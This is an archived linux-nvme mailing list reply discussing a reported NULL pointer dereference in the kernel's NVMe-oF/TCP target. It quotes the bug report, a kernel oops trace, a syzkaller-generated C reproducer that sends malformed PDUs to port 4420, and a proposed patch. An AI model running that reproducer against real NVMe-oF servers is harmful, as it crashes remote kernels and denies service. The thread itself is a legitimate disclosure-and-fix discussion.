Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 89F51C54E76
	for <linux-nvme@archiver.kernel.org>; Mon, 20 Nov 2023 10:56:54 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Transfer-Encoding:
	Content-Type:In-Reply-To:From:References:Cc:To:Subject:MIME-Version:Date:
	Message-ID:Reply-To:Content-ID:Content-Description:Resent-Date:Resent-From:
	Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
	bh=pVTShF6qC5wwpyOK0u7rJp2CeMFhjdYFg0T4J+LONJc=; b=Ta+T1qSqt5sskqfm169tQO15km
	LWDNgoUIipfBbzAvjxPzrhiubWbRARXX2tM/TMEwfjVvbO+LEngrfHfcF/ba9/p0t/wm87AMPAD4+
	d0wRdBYtkK4uguWDuu7HntwtEnQb5ZZUI2VUxFrtHtIwhSrnz76JEbL5XXNdLSTx8C947M5Hgnpy2
	M+5zm1BrC2Sf6y6toM2ddFnTMI7dZp+OB9IXaqQXXN1ADXJ8UAXly9W8ZpnncqrY8st28oZtNqqpV
	4Zvkw9381GUA0qqWNL43UR/kGxVJY/fnfKLd2R6aUHpTNhr1MedL+4W+nGNq+Qf5PQIHZ5MESbQtd
	kS5VC4PA==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1r51xJ-00Bq9i-25;
	Mon, 20 Nov 2023 10:56:41 +0000
Received: from mail-wm1-f53.google.com ([209.85.128.53])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1r51x7-00Bq4Y-36
	for linux-nvme@lists.infradead.org;
	Mon, 20 Nov 2023 10:56:38 +0000
Received: by mail-wm1-f53.google.com with SMTP id 5b1f17b1804b1-408ffb55b35so4311495e9.1
        for <linux-nvme@lists.infradead.org>; Mon, 20 Nov 2023 02:56:28 -0800 (PST)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1700477787; x=1701082587;
        h=content-transfer-encoding:in-reply-to:from:references:cc:to
         :content-language:subject:user-agent:mime-version:date:message-id
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=pVTShF6qC5wwpyOK0u7rJp2CeMFhjdYFg0T4J+LONJc=;
        b=u7Hm2JIsuvyZqXTSqZY0GolwfTWMbaXiefSlAEYfAgSWJW5DXXad39H+jiPmxKd3v/
         ueMvSluhul1Fk4/ahpu/laTfLjYZfyDOyKRa00Cw3DJYcCbwuWIDePFrhgeTpeDqWYeC
         Ok0oRXtHDRxEK1L6zcqAwi7nR1t/r78xGd9ww/p0kSvcfW1KiEc899n/Nm/sX6O5op9y
         PzF9jxeccARITUNTmuig/nc8ivBFpPmuY1J6zpbP0lREUBXNdpZqBNUpEZ97UHDJKgUl
         Gf33AS2cpkjtnaHgVe5mKYcfWXm0GWBTlGXgh9OT6Pp4lES2Aj/wzLwDA33IsPlI2bF0
         /3Yw==
X-Gm-Message-State: AOJu0Yyv3mJ+YOYLIK5jSZZ2in4z552fV1mhibs1gWWgl65j1yd4UQOU
	pSa2bcPq4/1b0mTXoCkcQFmud2vctP0=
X-Google-Smtp-Source: AGHT+IEVNvwpW8wgS0rW4PmfV79jUbGXdECA9nU25MrG4B55Ld1qogt5E4fWM9QtAC/KW52WTsLETg==
X-Received: by 2002:a05:600c:3c83:b0:40a:5268:bd8 with SMTP id bg3-20020a05600c3c8300b0040a52680bd8mr6133118wmb.0.1700477786989;
        Mon, 20 Nov 2023 02:56:26 -0800 (PST)
Received: from [192.168.64.177] (bzq-219-42-90.isdn.bezeqint.net. [62.219.42.90])
        by smtp.gmail.com with ESMTPSA id q11-20020a05600c46cb00b00403b63e87f2sm13172659wmo.32.2023.11.20.02.56.25
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Mon, 20 Nov 2023 02:56:26 -0800 (PST)
Message-ID: <69e7bbe4-b454-4941-90e2-2e6a4cf0f182@grimberg.me>
Date: Mon, 20 Nov 2023 12:56:25 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in
 `__nvmet_req_complete`
Content-Language: en-US
To: Chaitanya Kulkarni <chaitanyak@nvidia.com>,
 Alon Zahavi <zahavi.alon@gmail.com>,
 "linux-nvme@lists.infradead.org" <linux-nvme@lists.infradead.org>
Cc: Christoph Hellwig <hch@lst.de>
References: <CAK5usQuREC_n2dyTrv740v0PiddP2sdKKBqJG3kwbogZh+pv1Q@mail.gmail.com>
 <e04cadc4-9f52-48e1-9e4e-90b8beb020ce@nvidia.com>
From: Sagi Grimberg <sagi@grimberg.me>
In-Reply-To: <e04cadc4-9f52-48e1-9e4e-90b8beb020ce@nvidia.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231120_025631_020650_CEE1F877 
X-CRM114-Status: GOOD (  34.07  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org



On 11/7/23 12:03, Chaitanya Kulkarni wrote:
> On 11/6/23 05:41, Alon Zahavi wrote:
>> # Bug Overview
>>
>> ## The Bug
>> A null-ptr-deref in `__nvmet_req_complete`.
>>
>> ## Bug Location
>> `drivers/nvme/target/core.c` in the function `__nvmet_req_complete`.
>>
>> ## Bug Class
>> Remote Denial of Service
>>
>> ## Disclaimer:
>> This bug was found using Syzkaller with NVMe-oF/TCP added support.
>>
>> # Technical Details
>>
>> ## Kernel Report - NULL Pointer Dereference
>>
>> BUG: kernel NULL pointer dereference, address: 0000000000000020
>> #PF: supervisor read access in kernel mode
>> #PF: error_code(0x0000) - not-present page
>> PGD 0 P4D 0
>> Oops: 0000 [#1] PREEMPT SMP NOPTI
>> CPU: 2 PID: 31 Comm: kworker/2:0H Kdump: loaded Not tainted 6.5.0-rc1+ #5
>> Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop
>> Reference Platform, BIOS 6.00 11/12/2020
>> Workqueue: nvmet_tcp_wq nvmet_tcp_io_work
>> RIP: 0010:__nvmet_req_complete+0x33/0x350 drivers/nvme/target/core.c:740
>> Code: 41 57 41 56 41 55 41 54 49 89 fc 53 89 f3 48 83 ec 08 66 89 75
>> d6 e8 dc cd 1a ff 4d 8b 6c 24 10 bf 01 00 00 00 4d 8b 74 24 20 <45> 0f
>> b6 7d 20 44 89 fe e8 60 c8 1a ff 41 80 ff 01 0f 87 ef 75 96
>> RSP: 0018:ffffc90000527c00 EFLAGS: 00010293
>> RAX: 0000000000000000 RBX: 0000000000004002 RCX: 0000000000000000
>> RDX: ffff888100c74880 RSI: ffffffff82170d04 RDI: 0000000000000001
>> RBP: ffffc90000527c30 R08: 0000000000000001 R09: 0000000000000000
>> R10: 0000000000000000 R11: 0000000000000000 R12: ffff8881292a13e8
>> R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
>> FS:  0000000000000000(0000) GS:ffff888233f00000(0000) knlGS:0000000000000000
>> CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
>> CR2: 0000000000000020 CR3: 0000000003c6a005 CR4: 00000000007706e0
>> PKRU: 55555554
>> Call Trace:
>>    <TASK>
>>    nvmet_req_complete+0x2c/0x40 drivers/nvme/target/core.c:761
>>    nvmet_tcp_handle_h2c_data_pdu drivers/nvme/target/tcp.c:981
>>    nvmet_tcp_done_recv_pdu drivers/nvme/target/tcp.c:1020
>>    nvmet_tcp_try_recv_pdu+0x1132/0x1310 drivers/nvme/target/tcp.c:1182
>>    nvmet_tcp_try_recv_one drivers/nvme/target/tcp.c:1306
>>    nvmet_tcp_try_recv drivers/nvme/target/tcp.c:1338
>>    nvmet_tcp_io_work+0xe6/0xd90 drivers/nvme/target/tcp.c:1388
>>    process_one_work+0x3da/0x870 kernel/workqueue.c:2597
>>    worker_thread+0x67/0x640 kernel/workqueue.c:2748
>>    kthread+0x164/0x1b0 kernel/kthread.c:389
>>    ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
>>    </TASK>
>>
>> ## Description
>>
>> ### Tracing The Bug
>> The bug occurs during the execution of __nvmet_req_complete. Looking
>> in the report generated by syzkaller, we can see the exact line of
>> code that triggers the bug.
>>
>> Code Block 1:
>> ```
>> static void __nvmet_req_complete(struct nvmet_req *req, u16 status)
>> {
>> struct nvmet_ns *ns = req->ns;
>>
>> if (!req->sq->sqhd_disabled) // 1
>> nvmet_update_sq_head(req);
>>
>>     ..
>> }
>> ```
>>
>> In the first code block, we can see that there is a dereference of
>> `req->sq` when checking the condition `if (!req->sq->sqhd_disabled)`.
>> However, when executing the reproducer, `req->sq` is NULL. When trying
>> to dereference it, the kernel triggers a panic.
>>
>> ## Root Cause
>> `req` is initialized during `nvmet_req_init`. However, the sequence
>> that leads into `__nvmet_req_complete` does not contain any call for
>> `nvmet_req_init`, thus crashing the kernel with NULL pointer
>> dereference. This flow of execution can also create a situation where
>> an uninitialized memory address will be dereferenced, which has
>> undefined behaviour.
>>
>> ## Reproducer
>> I am adding a reproducer generated by Syzkaller with some
>> optimizations and minor changes.
>>
>> ```
>> // autogenerated by syzkaller (<https://github.com/google/syzkaller>)
>>
>> #define _GNU_SOURCE
>>
>> #include <endian.h>
>> #include <errno.h>
>> #include <fcntl.h>
>> #include <sched.h>
>> #include <stdarg.h>
>> #include <stdbool.h>
>> #include <stdint.h>
>> #include <stdio.h>
>> #include <stdlib.h>
>> #include <string.h>
>> #include <sys/mount.h>
>> #include <sys/prctl.h>
>> #include <sys/resource.h>
>> #include <sys/stat.h>
>> #include <sys/syscall.h>
>> #include <sys/time.h>
>> #include <sys/types.h>
>> #include <sys/wait.h>
>> #include <unistd.h>
>>
>> #include <linux/capability.h>
>>
>> uint64_t r[1] = {0xffffffffffffffff};
>>
>> void loop(void)
>> {
>>     intptr_t res = 0;
>>     res = syscall(__NR_socket, /*domain=*/2ul, /*type=*/1ul, /*proto=*/0);
>>     if (res != -1)
>>       r[0] = res;
>>     *(uint16_t*)0x20000100 = 2;
>>     *(uint16_t*)0x20000102 = htobe16(0x1144);
>>     *(uint32_t*)0x20000104 = htobe32(0x7f000001);
>>     syscall(__NR_connect, /*fd=*/r[0], /*addr=*/0x20000100ul, /*addrlen=*/0x10ul);
>>     *(uint8_t*)0x200001c0 = 0;
>>     *(uint8_t*)0x200001c1 = 0;
>>     *(uint8_t*)0x200001c2 = 0x80;
>>     *(uint8_t*)0x200001c3 = 0;
>>     *(uint32_t*)0x200001c4 = 0x80;
>>     *(uint16_t*)0x200001c8 = 0;
>>     *(uint8_t*)0x200001ca = 0;
>>     *(uint8_t*)0x200001cb = 0;
>>     *(uint32_t*)0x200001cc = 0;
>>     memcpy((void*)0x200001d0,
>>            "\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf"
>>            "\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf"
>>            "\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35"
>>            "\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86"
>>            "\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf"
>>            "\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf"
>>            "\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86",
>>            112);
>>     syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x80ul,
>>             /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
>>     *(uint8_t*)0x20000080 = 6;
>>     *(uint8_t*)0x20000081 = 3;
>>     *(uint8_t*)0x20000082 = 0x18;
>>     *(uint8_t*)0x20000083 = 0x1c;
>>     *(uint32_t*)0x20000084 = 2;
>>     *(uint16_t*)0x20000088 = 0x5d;
>>     *(uint16_t*)0x2000008a = 3;
>>     *(uint32_t*)0x2000008c = 0;
>>     *(uint32_t*)0x20000090 = 7;
>>     memcpy((void*)0x20000094, "\\x83\\x9e\\x4f\\x1a", 4);
>>     syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x20000080ul, /*len=*/0x80ul,
>>             /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
>> }
>> int main(void)
>> {
>>     syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>>             /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>>     syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
>>             /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>>     syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>>             /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>>     loop();
>>     return 0;
>> }
>> ```
>>
>>
> 
> 
> I'm not able to reproduce the problem [1], all I get is following error
> once I setup a target with nvmeof TCP and run the above program :-
> 
> [22180.507777] nvmet_tcp: failed to allocate queue, error -107
> 
> Can you try following patch? full disclosure I've compile tested
> and built this patch based on code inspection only :-

Yes, it looks like we are missing the same handling when we get a
malformed h2cdata pdu. If we want to gracefully fail it and keep the
connection going, we need to properly handle the failure.

Although, I didn't understand why should we try to intialize the request
in this case? its a clear error at this point...

> 
> diff --git a/drivers/nvme/target/tcp.c b/drivers/nvme/target/tcp.c
> index 92b74d0b8686..e35e8d79c66a 100644
> --- a/drivers/nvme/target/tcp.c
> +++ b/drivers/nvme/target/tcp.c
> @@ -992,12 +992,26 @@ static int nvmet_tcp_handle_h2c_data_pdu(struct
> nvmet_tcp_queue *queue)
>           }
> 
>           if (le32_to_cpu(data->data_offset) != cmd->rbytes_done) {
> +               struct nvme_command *nvme_cmd = &queue->pdu.cmd.cmd;
> +               struct nvmet_req *req = &cmd->req;
> +
>                   pr_err("ttag %u unexpected data offset %u (expected %u)\n",
>                           data->ttag, le32_to_cpu(data->data_offset),
>                           cmd->rbytes_done);
> -               /* FIXME: use path and transport errors */
> -               nvmet_req_complete(&cmd->req,
> -                       NVME_SC_INVALID_FIELD | NVME_SC_DNR);
> +
> +               memcpy(req->cmd, nvme_cmd, sizeof(*nvme_cmd));
> +               if (unlikely(!nvmet_req_init(req, &queue->nvme_cq,
> +                               &queue->nvme_sq, &nvmet_tcp_ops))) {
> +                       pr_err("failed cmd %p id %d opcode %d, data_len:
> %d\n",
> +                               req->cmd, req->cmd->common.command_id,
> +                               req->cmd->common.opcode,
> + le32_to_cpu(req->cmd->common.dptr.sgl.length));
> +                       nvmet_tcp_handle_req_failure(queue, cmd, req);
> +               } else {
> +                       /* FIXME: use path and transport errors */
> +                       nvmet_req_complete(&cmd->req,
> +                                       NVME_SC_INVALID_FIELD |
> NVME_SC_DNR);
> +               }
>                   return -EPROTO;
>           }
> 
> I'll try to reproduce these problems, else will ping you offline...
> 
> -ck
> 
> [1]
> nvme (nvme-6.7) # nvme list
> Node                  Generic               SN
> Model                                    Namespace
> Usage                      Format           FW Rev
> --------------------- --------------------- --------------------
> ---------------------------------------- ---------
> -------------------------- ---------------- --------
> /dev/nvme1n1          /dev/ng1n1            408a5a6db1e890944886
> Linux                                    1           1.07  GB / 1.07
> GB    512   B +  0 B   6.6.0nvm
> /dev/nvme0n1          /dev/ng0n1            foo QEMU NVMe
> Ctrl                           1           1.07  GB / 1.07  GB    512
> B +  0 B   1.0
> nvme (nvme-6.7) # cat /sys/kernel/config/nvmet/ports/0/addr_trtype
> tcp
> nvme (nvme-6.7) # cat /sys/kernel/config/nvmet/ports/0/addr_traddr
> 127.0.0.1
> nvme (nvme-6.7) # ./a.out
> nvme (nvme-6.7) # dmesg  -c
> [22106.230605] loop: module loaded
> [22106.246494] run blktests nvme/004 at 2023-11-07 01:58:06
> [22106.279272] loop0: detected capacity change from 0 to 2097152
> [22106.294374] nvmet: adding nsid 1 to subsystem blktests-subsystem-1
> [22106.302392] nvmet_tcp: enabling port 0 (127.0.0.1:4420)
> [22106.320146] nvmet: creating nvm controller 1 for subsystem
> blktests-subsystem-1 for NQN
> nqn.2014-08.org.nvmexpress:uuid:0f01fb42-9f7f-4856-b0b3-51e60b8de349.
> [22106.320859] nvme nvme1: creating 48 I/O queues.
> [22106.326035] nvme nvme1: mapped 48/0/0 default/read/poll queues.
> [22106.336551] nvme nvme1: new ctrl: NQN "blktests-subsystem-1", addr
> 127.0.0.1:4420
> [22180.507777] nvmet_tcp: failed to allocate queue, error -107
> 
> 

